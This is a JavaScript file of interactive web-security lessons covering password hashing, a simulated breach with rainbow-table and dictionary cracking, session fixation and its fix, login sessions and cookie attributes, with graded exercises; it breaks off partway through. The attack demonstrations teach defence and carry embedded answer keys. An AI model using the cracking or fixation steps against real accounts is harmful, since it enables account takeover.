window.LESSONS = window.LESSONS || [];
(function () {
  // ---------------------------------------------------------------------------
  // Widget builder: W(html, fn, cfg) → html-mode code string.
  // `fn` is a real function in this file; its source is serialized with
  // fn.toString() so widget scripts need no template-literal escaping.
  // `CFG` (JSON) lets starter/solution share one widget.
  // ---------------------------------------------------------------------------
  const BASE_CSS = `
body { margin: 10px; }
.card { border: 1px solid #e2e5ee; border-radius: 10px; padding: 10px 12px; background: #fff; margin-bottom: 10px; }
.card h4 { margin: 0 0 6px; font-size: 14px; }
.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
.muted { color: #646b80; font-size: 13px; }
.row { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; margin: 4px 0; }
.pill { display: inline-block; padding: 1px 8px; border-radius: 99px; font-size: 12px; font-weight: 600; }
.ok { background: #dcfce7; color: #166534; }
.bad { background: #fee2e2; color: #991b1b; }
.warnp { background: #fef3c7; color: #92400e; }
.info { background: #e0f2fe; color: #075985; }
table.t { border-collapse: collapse; width: 100%; font-size: 13px; }
table.t td, table.t th { border: 1px solid #e2e5ee; padding: 4px 6px; text-align: left; vertical-align: top; }
table.t th { background: #f4f6fa; }
code { background: #eef1f6; padding: 0 4px; border-radius: 4px; font-size: 12.5px; }
.result { margin-top: 8px; padding: 8px 10px; border-radius: 8px; font-size: 14px; }
.result:empty { display: none; }
textarea.code, input.code { font: 12.5px/1.45 ui-monospace, Menlo, monospace; width: 100%; box-sizing: border-box; }
button.primary { background: #087ea4; color: #fff; border-color: #087ea4; }
button.primary:hover { background: #066c8e; }
pre.seq-msg { border-radius: 8px; }
.seq-diagram svg { max-width: 800px; margin: 0 auto; }
.seq-diagram { max-height: 300px; }
.seq-msg { max-height: 170px; }
.tight .seq-hint { display: none; }
.tight table.t td, .tight table.t th { padding: 2px 6px; }
.tight .seq-diagram { max-height: 250px; }
.chip { font-size: 12.5px; padding: 2px 9px; }
`;
  function HELP() {
    window.$ = (s, r) => (r || document).querySelector(s);
    window.$$ = (s, r) => Array.from((r || document).querySelectorAll(s));
    window.esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    window.paint = (el, text, hl) => { el.innerHTML = Seq.colorMsg(text, hl); };
  }
  function W(html, fn, cfg) {
    return '<style>' + BASE_CSS + '</style>\n' + html.trim() + '\n<script>\nconst CFG = ' +
      JSON.stringify(cfg || {}).replace(/</g, '\\u003c') + ';\n(' + HELP.toString() + ')();\n(' +
      fn.toString() + ')();\n</' + 'script>';
  }

  // ======================= password-storage =======================
  const storeLab = W(`
<div class="card">
  <h4>🗄 One password, four ways to store it</h4>
  <div class="row">
    <label>username <input id="u" value="alice" style="width:100px"></label>
    <label>password <input id="p" value="Sunshine!2026" style="width:150px"></label>
    <button id="salt">🎲 new salt</button>
    <label class="muted">slow-hash work factor: 2^<span id="kv">12</span> rounds
      <input id="k" type="range" min="6" max="16" value="12" style="vertical-align:middle"></label>
  </div>
  <table class="t" id="rows" style="margin-top:6px"></table>
</div>
<div class="card">
  <h4>🧮 What an attacker with one high-end GPU can try (rough 2026 numbers)</h4>
  <table class="t" id="cost"></table>
  <div class="muted" style="margin-top:6px">Our “slow” row is iterated SHA-256 so it can run in this page. Real systems use
    <b>argon2id</b> (first choice; OWASP minimum <code>m=19456 KiB, t=2, p=1</code>), <b>scrypt</b>, or <b>bcrypt</b> (cost ≥ 10; only the first 72 bytes count).
    Their stored strings look like:<br>
    <code>$argon2id$v=19$m=19456,t=2,p=1$c2FsdHNhbHRzYWx0$Yx1N0r…</code><br>
    <code>$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW</code></div>
</div>
`, function () {
    let salt = Auth.randHex(16);
    function run() {
      const u = $('#u').value, p = $('#p').value, k = +$('#k').value, N = 1 << k;
      $('#kv').textContent = k;
      const plain = p, fast = Auth.sha256hex(p), salted = Auth.sha256hex(salt + p);
      const t0 = performance.now();
      let h = Auth.sha256(salt + p);
      for (let i = 1; i < N; i++) h = Auth.sha256(h);
      const ms = performance.now() - t0;
      const slow = Auth.hex(h);
      const row = (name, val, verdict, note) => '<tr><th style="width:150px">' + name + '</th><td><code style="word-break:break-all">' +
        esc(u) + ' | ' + esc(val) + '</code><div class="muted">' + note + '</div></td><td style="width:90px">' + verdict + '</td></tr>';
      $('#rows').innerHTML = '<tr><th>Storage</th><th>Row in the users table</th><th>Verdict</th></tr>' +
        row('Plaintext', plain, '<span class="pill bad">never</span>', 'A leaked backup = every password, instantly. Also visible to every admin.') +
        row('SHA-256', fast, '<span class="pill bad">bad</span>', 'One-way, but <b>fast</b> and unsalted: everyone with this password has the same hash, and precomputed tables crack it.') +
        row('Salted SHA-256', 'salt=' + salt + ' hash=' + salted, '<span class="pill warnp">weak</span>', 'Random per-user salt: identical passwords now look different, rainbow tables are useless. Still billions of guesses per second.') +
        row('Slow + salted', 'salt=' + salt + ' hash=' + slow, '<span class="pill ok">good</span>', 'Took <b>' + ms.toFixed(1) + ' ms</b> here (' + N.toLocaleString() + ' rounds). Login waits once; an attacker waits that long <b>per guess, per user</b>.');
      const gps = { 'SHA-256 (fast)': 2e10, 'bcrypt cost 12': 1.5e3, 'argon2id m=19 MiB t=2': 1e3 };
      const fmt = (s) => s < 1 ? (s * 1000).toFixed(2) + ' ms' : s < 120 ? s.toFixed(1) + ' s' : s < 7200 ? (s / 60).toFixed(0) + ' min' :
        s < 172800 ? (s / 3600).toFixed(1) + ' h' : s < 3e7 ? (s / 86400).toFixed(0) + ' days' : (s / 3.15e7).toFixed(0) + ' years';
      $('#cost').innerHTML = '<tr><th>Hash</th><th>Guesses / second</th><th>Try the 10 million most common passwords, one user</th><th>Try all 8-char lowercase+digits (2.8 × 10¹²)</th></tr>' +
        Object.keys(gps).map((k2) => '<tr><td>' + k2 + '</td><td>~' + gps[k2].toLocaleString() + '</td><td>' + fmt(1e7 / gps[k2]) + '</td><td>' + fmt(2.8e12 / gps[k2]) + '</td></tr>').join('');
    }
    $$('#u, #p').forEach((i) => i.addEventListener('input', run));
    $('#k').addEventListener('input', run);
    $('#salt').onclick = () => { salt = Auth.randHex(16); run(); };
    run();
  });

  const breach = W(`
<div class="card">
  <h4>💥 Breach simulator: the attacker downloads your users table</h4>
  <div class="row">
    <label>Your app stores passwords as
      <select id="mode">
        <option value="plain">plaintext</option>
        <option value="sha" selected>SHA-256 (no salt)</option>
        <option value="salt">salted SHA-256</option>
        <option value="slow">salted argon2id (simulated cost)</option>
      </select></label>
    <button id="atk" class="primary">🕵 Run the attack</button>
  </div>
</div>
<div class="grid2">
  <div class="card"><h4>Leaked table (what the attacker has)</h4><div id="db"></div></div>
  <div class="card"><h4>Attacker’s rainbow table (precomputed SHA-256 of common passwords)</h4>
    <div id="rt" style="font:11px/1.5 ui-monospace,Menlo,monospace;max-height:220px;overflow:auto"></div></div>
</div>
<div class="card"><h4>Attack log</h4><div id="log" class="muted">Choose a storage mode and click “Run the attack”.</div></div>
`, function () {
    const USERS = [['alice', '123456'], ['bob', 'password'], ['carol', 'Tr0ub4dor&3'], ['dave', '123456'], ['erin', 'correct horse battery staple'], ['frank', 'qwerty']];
    const COMMON = ['123456', 'password', '123456789', '12345678', 'qwerty', 'abc123', '111111', 'iloveyou', 'dragon', 'letmein', 'monkey', 'football', 'admin', 'welcome', 'sunshine'];
    const salts = USERS.map(() => Auth.randHex(8));
    const RT = {};
    COMMON.forEach((p) => (RT[Auth.sha256hex(p)] = p));
    $('#rt').innerHTML = COMMON.map((p) => Auth.sha256hex(p).slice(0, 24) + '… → <b>' + esc(p) + '</b>').join('<br>') + '<br>… (real tables: billions of entries)';
    function stored(i) {
      const m = $('#mode').value, pw = USERS[i][1];
      if (m === 'plain') return pw;
      if (m === 'sha') return Auth.sha256hex(pw);
      if (m === 'salt') return salts[i] + ':' + Auth.sha256hex(salts[i] + pw);
      return '$argon2id$v=19$m=19456,t=2,p=1$' + Auth.b64(salts[i]).replace(/=+$/, '') + '$' + Auth.sha256b64url('slow' + salts[i] + pw).slice(0, 22) + '…';
    }
    function showDb(cracked) {
      $('#db').innerHTML = '<table class="t" style="font-size:11.5px"><tr><th>user</th><th>stored value</th><th>cracked?</th></tr>' +
        USERS.map((u, i) => '<tr><td>' + u[0] + '</td><td><code style="word-break:break-all">' + esc(stored(i)) + '</code></td><td>' +
          (cracked && cracked[i] ? '<span class="pill bad">' + esc(cracked[i]) + '</span>' : cracked ? '<span class="pill ok">safe (for now)</span>' : '') + '</td></tr>').join('') + '</table>';
    }
    function attack() {
      const m = $('#mode').value, cracked = {}, log = [];
      if (m === 'plain') {
        USERS.forEach((u, i) => (cracked[i] = u[1]));
        log.push('📖 Nothing to crack. Every password is readable right away. Attackers now try them on email, banking, … (credential stuffing).');
      } else if (m === 'sha') {
        const seen = {};
        USERS.forEach((u, i) => { const h = stored(i); (seen[h] = seen[h] || []).push(u[0]); if (RT[h]) cracked[i] = RT[h]; });
        Object.values(seen).filter((x) => x.length > 1).forEach((x) => log.push('👯 <b>' + x.join(' and ') + '</b> have the same hash, so they have the same password. No cracking needed to know that.'));
        log.push('⚡ Rainbow-table lookup: one dictionary lookup per hash, ~0 seconds. Cracked ' + Object.keys(cracked).length + ' of ' + USERS.length + '.');
      } else {
        log.push('🧂 Rainbow table: 0 hits. Each hash is mixed with its own salt, so the precomputed table is useless and identical passwords look different.');
        const gps = m === 'salt' ? 2e10 : 1e3;
        USERS.forEach((u, i) => { const idx = COMMON.indexOf(u[1]); if (idx >= 0) cracked[i] = u[1]; });
        const per = 1e7 / gps;
        log.push('🔁 Dictionary attack, <b>separately for each user</b> (salt in front of each guess): 10 million guesses at ~' + gps.toLocaleString() + '/s = <b>' +
          (per < 1 ? (per * 1000).toFixed(1) + ' ms' : per < 3600 ? (per / 60).toFixed(0) + ' min' : (per / 3600).toFixed(1) + ' hours') + ' per user</b>.');
        log.push(m === 'salt' ? '⚠️ Still fast. Weak passwords fall in milliseconds; salting alone is not enough.' :
          '🐢 With a slow hash the same attack costs hours per user. Common passwords are still found (they are near the top of every list) but strong ones like carol’s and erin’s are out of reach.');
      }
      showDb(cracked);
      $('#log').innerHTML = log.map((l) => '<div style="margin:3px 0">' + l + '</div>').join('');
    }
    $('#mode').onchange = () => { showDb(null); $('#log').textContent = 'Click “Run the attack”.'; };
    $('#atk').onclick = attack;
    showDb(null);
  });

  function crackExercise() {
    const SALT = 'c0ffee42', TARGET = Auth.sha256hex(SALT + 'dragon');
    $('#target').textContent = 'alice | salt=' + SALT + ' | sha256=' + TARGET;
    $('#cs').value = SALT;
    $('#ans').value = CFG.value;
    function calc() {
      const h = Auth.sha256hex($('#cs').value + $('#cg').value);
      $('#ch').innerHTML = '<code style="word-break:break-all">' + h + '</code> ' + (h === TARGET ? '<span class="pill bad">MATCH</span>' : '<span class="pill info">no match</span>');
    }
    $$('#cs, #cg').forEach((i) => i.addEventListener('input', calc));
    $$('[data-g]').forEach((b) => (b.onclick = () => { $('#cg').value = b.dataset.g; calc(); }));
    calc();
    $('#check').onclick = () => {
      const ok = Auth.sha256hex(SALT + $('#ans').value) === TARGET;
      const r = $('#result');
      r.className = 'result ' + (ok ? 'ok' : 'bad');
      r.innerHTML = ok ? '✅ Cracked: alice’s password is <code>dragon</code>. Salt stopped rainbow tables but not a dictionary attack on a weak password with a fast hash. Slow hashes + long passwords + MFA are the real fix.'
        : '❌ sha256(salt + “' + esc($('#ans').value) + '”) does not match. Use the calculator to try each leaked password.';
    };
  }
  const crackHtml = `
<div class="card">
  <h4>Leaked row</h4>
  <code id="target" style="word-break:break-all"></code>
  <div class="muted" style="margin-top:4px">The app computed <code>sha256(salt + password)</code>. Top leaked passwords:
    <button class="chip" data-g="123456">123456</button><button class="chip" data-g="password">password</button>
    <button class="chip" data-g="qwerty">qwerty</button><button class="chip" data-g="letmein">letmein</button>
    <button class="chip" data-g="dragon">dragon</button><button class="chip" data-g="iloveyou">iloveyou</button></div>
</div>
<div class="card">
  <h4>🧮 Hash calculator</h4>
  <div class="row">salt <input id="cs" class="code" style="width:120px"> + guess <input id="cg" class="code" style="width:160px" placeholder="click a chip above"></div>
  <div id="ch" style="margin-top:4px"></div>
</div>
<div class="card">
  <h4>Your answer: alice’s password</h4>
  <div class="row"><input id="ans" class="code" style="width:220px"> <button id="check" class="primary">Check</button></div>
  <div id="result" class="result"></div>
</div>`;

  // ======================= session-login =======================
  const sessionSeq = W(`<div id="flow"></div>`, function () {
    const sid = Auth.randB64url(16), sid2 = Auth.randB64url(16), fix = 'ATTACKER-KNOWN-1234';
    const COOK = '; Path=/; HttpOnly; Secure; SameSite=Lax';
    const body = 'username=alice&password=wonder1and';
    const post = (c) => 'POST /login HTTP/1.1\nHost: shop.test\nOrigin: https://shop.test\nContent-Type: application/x-www-form-urlencoded' + (c ? '\nCookie: sid=' + c : '') + '\n\n' + body;
    const store0 = { 'users.alice': '$argon2id$v=19$m=19456,t=2,p=1$…' };
    Seq.mount('#flow', {
      title: 'Form login with a server-side session',
      actors: [
        { id: 'x', label: 'Attacker', icon: '🕵' },
        { id: 'b', label: 'Alice’s browser', icon: '🌐', store: {}, storeLabel: 'Cookie jar (shop.test)' },
        { id: 's', label: 'shop.test', icon: '🖥', store: store0, storeLabel: 'Session store' },
      ],
      scenarios: [
        { name: '✅ Login → dashboard → logout', actors: [
            { id: 'b', label: 'Alice’s browser', icon: '🌐', store: {}, storeLabel: 'Cookie jar (shop.test)' },
            { id: 's', label: 'shop.test', icon: '🖥', store: store0, storeLabel: 'Server: users + session store' }],
          steps: [
          { from: 'b', to: 's', label: 'GET /login', msg: 'GET /login HTTP/1.1\nHost: shop.test\nAccept: text/html' },
          { from: 's', to: 'b', kind: 'res', label: '200 login form', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\n\n<form method="post" action="/login">\n  <input name="username"> <input type="password" name="password">\n  <button>Log in</button>\n</form>' },
          { from: 'b', to: 's', label: 'POST /login (form body)', msg: post(), hl: ['password=wonder1and'], note: 'The browser sends the form as <code>application/x-www-form-urlencoded</code> (lesson 1.1), over HTTPS.' },
          { from: 's', to: 's', label: 'verify password hash', note: 'Look up alice, run <code>argon2id(password, her salt)</code> and compare with the stored hash in constant time. ✓' },
          { from: 's', to: 's', label: 'create session', note: 'Generate a <b>random, unguessable</b> id (≥ 128 bits from a CSPRNG) and store what it means on the server.',
            set: { s: { ['session ' + sid.slice(0, 10) + '…']: 'user=alice, created=10:00, expires=10:30 idle' } } },
          { from: 's', to: 'b', kind: 'redirect', label: '303 + Set-Cookie: sid', msg: 'HTTP/1.1 303 See Other\nLocation: /dashboard\nSet-Cookie: sid=' + sid + COOK, hl: ['Set-Cookie', 'HttpOnly', 'Secure', 'SameSite=Lax'],
            note: '<code>HttpOnly</code>: JS can’t read it. <code>Secure</code>: HTTPS only. <code>SameSite=Lax</code>: not sent on cross-site POSTs. <code>303</code>: “now GET /dashboard”.',
            set: { b: { sid: sid } } },
          { from: 'b', to: 's', label: 'GET /dashboard + Cookie', msg: 'GET /dashboard HTTP/1.1\nHost: shop.test\nCookie: sid=' + sid, hl: ['Cookie'], note: 'The browser follows the redirect and attaches the cookie automatically.' },
          { from: 's', to: 's', label: 'lookup sid → alice', note: 'The cookie is only a pointer. Who you are, your roles, your cart: all stay on the server.' },
          { from: 's', to: 'b', kind: 'res', label: '200 dashboard', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\nCache-Control: no-store\n\n<h1>Hi alice</h1>' },
          { from: 'b', to: 's', label: 'POST /logout', msg: 'POST /logout HTTP/1.1\nHost: shop.test\nCookie: sid=' + sid + '\nContent-Type: application/x-www-form-urlencoded\n\ncsrf_token=Yq3…', note: 'Logout is a POST (with a CSRF token, lesson 2.4) so other sites can’t log you out with a link.' },
          { from: 's', to: 's', label: 'destroy session', note: 'Delete the record. Even if someone kept a copy of the cookie, it now points to nothing.',
            set: { s: { ['session ' + sid.slice(0, 10) + '…']: null } } },
          { from: 's', to: 'b', kind: 'redirect', label: '303 + expire cookie', msg: 'HTTP/1.1 303 See Other\nLocation: /login\nSet-Cookie: sid=; Max-Age=0' + COOK, hl: ['Max-Age=0'],
            note: '<code>Max-Age=0</code> tells the browser to delete the cookie.', set: { b: { sid: null } } },
        ] },
        { name: '❌ Wrong password', actors: [
            { id: 'b', label: 'Alice’s browser', icon: '🌐', store: {}, storeLabel: 'Cookie jar (shop.test)' },
            { id: 's', label: 'shop.test', icon: '🖥', store: Object.assign({ 'failed attempts (alice)': '0' }, store0), storeLabel: 'Server' }],
          steps: [
          { from: 'b', to: 's', label: 'POST /login (typo)', msg: post().replace('wonder1and', 'wonderland'), hl: ['wonderland'] },
          { from: 's', to: 's', label: 'verify ✗', note: 'Hash doesn’t match. No session is created. A failure counter goes up (rate limiting).', set: { s: { 'failed attempts (alice)': '1' } } },
          { from: 's', to: 'b', kind: 'res', label: '200 form + generic error', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<p class="error">Invalid username or password.</p>\n<form method="post" action="/login">…</form>',
            hl: ['Invalid username or password'], note: 'The same message for “unknown user” and “wrong password”, so attackers can’t discover which usernames exist. (Form logins re-render the page; some apps use 400/422. Not 401, which is for <code>WWW-Authenticate</code> schemes.)' },
          { from: 'b', to: 's', label: '… 5th wrong attempt', msg: post().replace('wonder1and', 'guess5'), set: { s: { 'failed attempts (alice)': '5' } } },
          { from: 's', to: 'b', kind: 'err', label: '429 Too Many Requests', msg: 'HTTP/1.1 429 Too Many Requests\nRetry-After: 60\nContent-Type: text/html\n\n<p>Too many attempts. Try again in a minute.</p>', hl: ['429', 'Retry-After'],
            note: 'Throttling makes online password guessing slow. No cookie was ever set: the jar stays empty.' },
        ] },
        { name: '🕵 Session fixation (vulnerable)', steps: [
          { from: 'x', to: 's', label: 'GET /login', msg: 'GET /login HTTP/1.1\nHost: shop.test', note: 'The attacker visits the site first, anonymously.' },
          { from: 's', to: 'x', kind: 'res', label: '200 + Set-Cookie: sid=' + fix.slice(0, 8) + '…', msg: 'HTTP/1.1 200 OK\nSet-Cookie: sid=' + fix + COOK, hl: [fix],
            note: 'Many apps give every visitor an anonymous session (for a cart, say). The attacker now <b>knows</b> a valid session id.', set: { s: { ['session ' + fix]: 'anonymous' } } },
          { from: 'x', to: 'b', kind: 'info', label: 'plant sid in victim', msg: '# e.g. a link to an app that accepts ids in the URL:\nhttps://shop.test/login;jsessionid=' + fix + '\n# or a cookie set from a compromised subdomain:\nSet-Cookie: sid=' + fix + '; Domain=shop.test',
            note: 'The attacker gets the same id into Alice’s browser.', set: { b: { sid: fix } } },
          { from: 'b', to: 's', label: 'POST /login + Cookie: sid=' + fix.slice(0, 8) + '…', msg: post(fix), hl: [fix], note: 'Alice logs in normally. Her browser sends the planted cookie along.' },
          { from: 's', to: 's', label: 'password ✓, keep same id ❌', note: '<b>BUG:</b> the server just writes <code>user=alice</code> into the <b>existing</b> session.', set: { s: { ['session ' + fix]: 'user=alice' } } },
          { from: 's', to: 'b', kind: 'redirect', label: '303 /dashboard (no new cookie)', msg: 'HTTP/1.1 303 See Other\nLocation: /dashboard' },
          { from: 'x', to: 's', label: 'GET /dashboard + same sid', msg: 'GET /dashboard HTTP/1.1\nHost: shop.test\nCookie: sid=' + fix, hl: [fix], note: 'The attacker uses the id they chose at the start.' },
          { from: 's', to: 'x', kind: 'err', label: '200 alice’s dashboard 💥', msg: 'HTTP/1.1 200 OK\n\n<h1>Hi alice</h1>', note: 'The attacker is logged in as Alice without ever learning her password.' },
        ] },
        { name: '🛡 Fixed: regenerate id on login', steps: [
          { from: 'x', to: 'b', kind: 'info', label: 'plant sid in victim', msg: 'Set-Cookie: sid=' + fix + '; Domain=shop.test', set: { b: { sid: fix }, s: { ['session ' + fix]: 'anonymous' } },
            note: 'Same start: Alice’s browser carries an id the attacker knows.' },
          { from: 'b', to: 's', label: 'POST /login + Cookie: sid=' + fix.slice(0, 8) + '…', msg: post(fix), hl: [fix] },
          { from: 's', to: 's', label: 'password ✓, regenerate id', note: 'Destroy the old session and create a <b>new random id</b> (copy over cart data if needed). In Express: <code>req.session.regenerate()</code>; Spring Security does it by default.',
            set: { s: { ['session ' + fix]: null, ['session ' + sid2.slice(0, 10) + '…']: 'user=alice' } } },
          { from: 's', to: 'b', kind: 'redirect', label: '303 + Set-Cookie: NEW sid', msg: 'HTTP/1.1 303 See Other\nLocation: /dashboard\nSet-Cookie: sid=' + sid2 + COOK, hl: ['Set-Cookie'], set: { b: { sid: sid2 } } },
          { from: 'x', to: 's', label: 'GET /dashboard + old sid', msg: 'GET /dashboard HTTP/1.1\nHost: shop.test\nCookie: sid=' + fix, hl: [fix] },
          { from: 's', to: 's', label: 'lookup → not found', note: 'The planted id no longer exists.' },
          { from: 's', to: 'x', kind: 'redirect', label: '303 → /login', msg: 'HTTP/1.1 303 See Other\nLocation: /login', note: 'Attack defeated. Rule: <b>new privilege level → new session id</b> (login, MFA step-up, role change).' },
        ] },
      ],
    });
  });

  const liveLogin = W(`
<div class="grid2">
  <div class="card">
    <div class="row" style="background:#f4f6fa;border-radius:8px;padding:4px 8px;font:12.5px ui-monospace,Menlo,monospace">🔒 https://shop.test<span id="addr"></span></div>
    <div id="page" style="padding:8px 4px;min-height:140px"></div>
    <div class="row muted">Browser actions:
      <button id="goDash">visit /dashboard</button>
      <button id="clearCk">🧹 clear cookies</button>
      <button id="restart">🔄 restart server</button>
    </div>
  </div>
  <div>
    <div class="card"><h4>🍪 Cookie jar (browser)</h4><div id="jar" style="font:12px ui-monospace,Menlo,monospace"></div></div>
    <div class="card"><h4>🗄 Session store (server)</h4><div id="store" style="font:12px ui-monospace,Menlo,monospace"></div>
      <div class="muted">Users: <code>alice / wonder1and</code>, <code>bob / builder42</code></div></div>
  </div>
</div>
<div class="card"><h4>📡 Last HTTP exchange <span class="muted" id="cnt"></span></h4><pre id="wire" class="seq-msg" style="max-height:230px"></pre></div>
`, function () {
    const SALT = { alice: Auth.randHex(8), bob: Auth.randHex(8) };
    const USERS = { alice: Auth.sha256hex(SALT.alice + 'wonder1and'), bob: Auth.sha256hex(SALT.bob + 'builder42') };
    let jar = {}, store = {}, path = '/login', view = { kind: 'login' }, n = 0;
    const CK = '; Path=/; HttpOnly; Secure; SameSite=Lax';
    function server(method, p, form) {
      const sid = jar.sid, sess = sid && store[sid];
      if (method === 'GET' && p === '/login') return { st: '200 OK', h: ['Content-Type: text/html'], view: { kind: 'login' } };
      if (method === 'POST' && p === '/login') {
        const u = form.username, ok = USERS[u] && Auth.sha256hex(SALT[u] + form.password) === USERS[u];
        if (!ok) return { st: '200 OK', h: ['Content-Type: text/html'], view: { kind: 'login', err: true }, note: 'verify ✗ → no session' };
        if (sid) delete store[sid];
        const nid = Auth.randB64url(12);
        store[nid] = { user: u, created: new Date().toLocaleTimeString() };
        return { st: '303 See Other', h: ['Location: /dashboard', 'Set-Cookie: sid=' + nid + CK], set: nid, follow: '/dashboard', note: 'verify ✓ → new session ' + nid };
      }
      if (method === 'GET' && p === '/dashboard') {
        if (!sess) return { st: '303 See Other', h: ['Location: /login'], follow: '/login', note: sid ? 'sid not in store → anonymous' : 'no cookie → anonymous' };
        return { st: '200 OK', h: ['Content-Type: text/html', 'Cache-Control: no-store'], view: { kind: 'dash', user: sess.user } };
      }
      if (method === 'POST' && p === '/logout') {
        if (sid) delete store[sid];
        return { st: '303 See Other', h: ['Location: /login', 'Set-Cookie: sid=; Max-Age=0' + CK], set: '', follow: '/login', note: 'session destroyed' };
      }
      return { st: '404 Not Found', h: [], view: { kind: 'login' } };
    }
    function send(method, p, form, trail) {
      const body = form ? new URLSearchParams(form).toString() : '';
      const req = [method + ' ' + p + ' HTTP/1.1', 'Host: shop.test'].concat(jar.sid ? ['Cookie: sid=' + jar.sid] : [],
        form ? ['Content-Type: application/x-www-form-urlencoded', '', body] : []).join('\n');
      const res = server(method, p, form);
      const raw = '# → request\n' + req + '\n# ← response' + (res.note ? '  (' + res.note + ')' : '') + '\nHTTP/1.1 ' + res.st + '\n' + res.h.join('\n');
      if (res.set !== undefined) { if (res.set) jar.sid = res.set; else delete jar.sid; }
      trail = (trail || []).concat(raw);
      n++;
      if (res.follow) return send('GET', res.follow, null, trail);
      path = p; view = res.view;
      $('#cnt').textContent = '(' + trail.length + ' request' + (trail.length > 1 ? 's, redirect followed automatically' : '') + ')';
      $('#wire').innerHTML = trail.map((t) => Seq.colorMsg(t, ['Cookie', 'Set-Cookie', 'Location'])).join('\n\n<span class="cm"># ───────── next request ─────────</span>\n');
      render();
    }
    function render() {
      $('#addr').textContent = path;
      if (view.kind === 'login') {
        $('#page').innerHTML = '<b>Log in</b>' + (view.err ? '<div class="pill bad" style="margin:4px 0">Invalid username or password.</div>' : '') +
          '<div class="row"><input id="lu" placeholder="username" value="alice" style="width:110px"><input id="lp" type="password" placeholder="password" style="width:120px"><button id="lb" class="primary">Log in</button></div>' +
          '<div class="muted">Try a wrong password first, then <code>wonder1and</code>.</div>';
        $('#lb').onclick = () => send('POST', '/login', { username: $('#lu').value, password: $('#lp').value });
      } else {
        $('#page').innerHTML = '<h3>👋 Hi ' + esc(view.user) + '</h3><div class="muted">This page was rendered because the server found your sid in its store.</div>' +
          '<button id="lo" style="margin-top:8px">Log out</button>';
        $('#lo').onclick = () => send('POST', '/logout', { csrf_token: 'demo' });
      }
      $('#jar').innerHTML = jar.sid ? '<span class="k" style="color:#8a3ffc">sid</span> = ' + jar.sid + '<div class="muted">HttpOnly · Secure · SameSite=Lax · Path=/</div>' : '<i class="muted">empty</i>';
      const ks = Object.keys(store);
      $('#store').innerHTML = ks.length ? ks.map((k) => '<div><span style="color:#8a3ffc">' + k + '</span> → user=' + store[k].user + ', since ' + store[k].created + '</div>').join('') : '<i class="muted">empty</i>';
    }
    $('#goDash').onclick = () => send('GET', '/dashboard');
    $('#clearCk').onclick = () => { jar = {}; render(); $('#wire').innerHTML = Seq.colorMsg('# cookies cleared in the browser\n# (the server session still exists until it expires)'); };
    $('#restart').onclick = () => { store = {}; render(); $('#wire').innerHTML = Seq.colorMsg('# server restarted: in-memory session store wiped\n# your old cookie now points to nothing. Try "visit /dashboard".'); };
    send('GET', '/login');
  });

  function setCookieExercise() {
    $('#ans').value = CFG.value;
    $('#check').onclick = () => {
      const v = $('#ans').value.trim();
      const msgs = [];
      const m = /^Set-Cookie:\s*(.*)$/i.exec(v);
      if (!m) msgs.push('Start with the header name <code>Set-Cookie:</code>');
      const parts = (m ? m[1] : v).split(';').map((x) => x.trim()).filter(Boolean);
      const nv = (parts[0] || '').split('=');
      if (nv[0] !== 'sid' || nv.slice(1).join('=') !== '9fK2LmQx7Rt0') msgs.push('First comes <code>name=value</code>: <code>sid=9fK2LmQx7Rt0</code>');
      const attrs = {};
      parts.slice(1).forEach((a) => { const i = a.indexOf('='); attrs[(i < 0 ? a : a.slice(0, i)).toLowerCase()] = i < 0 ? true : a.slice(i + 1); });
      if (!attrs.httponly) msgs.push('JavaScript must not read it → <code>HttpOnly</code>');
      if (!attrs.secure) msgs.push('Only over HTTPS → <code>Secure</code>');
      if (String(attrs.samesite || '').toLowerCase() !== 'lax') msgs.push('Not on cross-site POSTs, but still on links from emails → <code>SameSite=Lax</code>');
      if (attrs.path !== '/') msgs.push('Valid for the whole site → <code>Path=/</code>');
      if (attrs.domain) msgs.push('No <code>Domain</code>: leaving it out keeps the cookie on exactly shop.test (host-only), not on subdomains.');
      if (attrs.expires || attrs['max-age']) msgs.push('A session cookie for this task: no <code>Max-Age</code>/<code>Expires</code> (deleted when the browser session ends).');
      const r = $('#result');
      r.className = 'result ' + (msgs.length ? 'bad' : 'ok');
      r.innerHTML = msgs.length ? '❌ ' + msgs.join('<br>') : '✅ A textbook session cookie. Attribute order doesn’t matter.';
    };
  }
  const setCookieHtml = `
<div class="card">
  <h4>Write the Set-Cookie header for a fresh login</h4>
  <div class="muted">Session id: <code>9fK2LmQx7Rt0</code>. Requirements: not readable by JavaScript · only sent over HTTPS ·
    not sent on cross-site form POSTs (but sent when the user clicks a link from an email) · valid for every path · only for shop.test itself, not subdomains ·
    a session cookie (no expiry).</div>
  <pre class="seq-msg" style="margin-top:6px">HTTP/1.1 303 See Other
Location: /dashboard</pre>
  <input id="ans" class="code">
  <div class="row"><button id="check" class="primary">Check</button></div>
  <div id="result" class="result"></div>
</div>`;

  // ======================= cookie-attributes =======================
  const cookieSim = W(`
<div class="card tight">
  <h4>🍪 Cookie set by <code>https://shop.test</code> (change the attributes)</h4>
  <div class="row">
    <label>name <select id="name"><option>sid</option><option>__Secure-sid</option><option>__Host-sid</option></select></label>
    <label><input type="checkbox" id="ho" checked> HttpOnly</label>
    <label><input type="checkbox" id="sec" checked> Secure</label>
    <label>SameSite <select id="ss"><option value="">(not set)</option><option>Strict</option><option selected>Lax</option><option>None</option></select></label>
    <label>Domain <select id="dom"><option value="">(none: host-only)</option><option>shop.test</option></select></label>
    <label>Path <select id="path"><option>/</option><option>/account</option></select></label>
    <label>Max-Age <select id="age"><option value="">(session)</option><option>3600</option><option>0</option></select></label>
  </div>
  <pre id="hdr" class="seq-msg" style="margin:6px 0 0"></pre>
  <div id="accept" style="margin-top:6px"></div>
</div>
<div class="card tight">
  <table class="t" id="ctx"></table>
  <div class="muted" style="margin-top:4px">Browser model: Chromium 2026 (Lax-by-default). Change any attribute above and every row updates.</div>
</div>
`, function () {
    const CTX = [
      { t: 'Same-site link: on shop.test click “Home”', url: 'https://shop.test/', p: '/', cross: false, kind: 'nav', m: 'GET' },
